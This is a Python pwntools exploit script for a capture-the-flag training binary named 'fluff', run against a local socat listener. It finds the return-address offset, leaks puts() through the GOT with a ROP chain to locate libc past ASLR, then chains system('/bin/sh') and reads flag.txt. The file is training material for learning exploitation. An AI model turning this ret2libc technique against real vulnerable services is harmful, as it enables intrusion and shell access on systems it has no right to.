from pwn import *

#run this command to have the binary listen on localhost:1234
#socat TCP4-LISTEN:1234,reuseaddr,fork EXEC:./write4

context.clear(arch="amd64")
LOCATION = "./fluff"
LIBC_LOC = "/lib/x86_64-linux-gnu/libc.so.6" #used libc found with ldd ./binary
REMOTE   = remote("localhost", 1234)         #binary listening on the machine

binary  = ELF(LOCATION)
libc    = ELF(LIBC_LOC)
ropLeak = ROP(binary)
ropExp  = ROP(binary)

def pcOffset(): 
    proc = process(LOCATION, timeout=2)
    proc.sendline(cyclic(1024, n=8))
    proc.recvall()  
    core = Core("core")
    pcOff = cyclic_find(core.pc, n=8)
    log.info("RIP offset at {0}".format(pcOff))
    return pcOff

def leakAddr():
    ropLeak.puts(binary.got["puts"])  #generate ropchain to call leak puts() address
    ropLeak.main()                    #append main() to ropchain in order not to crash the binary
    leak  = 'A' * offset              #overflow buffer
    leak += str(ropLeak)
    REMOTE.recvuntil('>')
    REMOTE.sendline(leak)
    REMOTE.recv()
    value = u64(str(REMOTE.recv(6) + "\x00\x00")) #black wizardry to pack return address is done here:
    # even though architecture is 64bit the real addresses with ASLR enabled use up to th 47th bit, hence
    # we get 6 bytes back by puts(). We append 2 null bytes at the end (little endianness, bitch) to form a
    # 8 byte address that gets passed to u64()
    return value

def exploit():
    ropExp.system(next(libc.search("/bin/sh\x00"))) #generate ropchain to call system("/bin/sh")
    exp  = 'A' * offset                             #overflow buffer
    exp += str(ropExp)                              #overwrite RIP with previously created ropchain
    REMOTE.recvuntil('>')
    REMOTE.sendline(exp)
    log.info("Running exploit, you should get the flag now...")
    REMOTE.sendline("cat flag.txt && exit")
    log.success("Flag:{0}".format(REMOTE.recvall()))
    #REMOTE.interactive() #uncomment this to get a full shell

def getBaseAddr(offset):
    putsLeak = leakAddr() #leak remote address of puts()
    log.success("Leaked puts() at {0}".format(hex(putsLeak)))
    libc.address = putsLeak - libc.symbols["puts"]  #find libc base address subtracting puts() offset from its address
    log.success("Base address of libc at {0}".format(hex(libc.address)))

offset = pcOffset()
getBaseAddr(offset) #call getBaseAddr() to get the base address of libc
exploit()



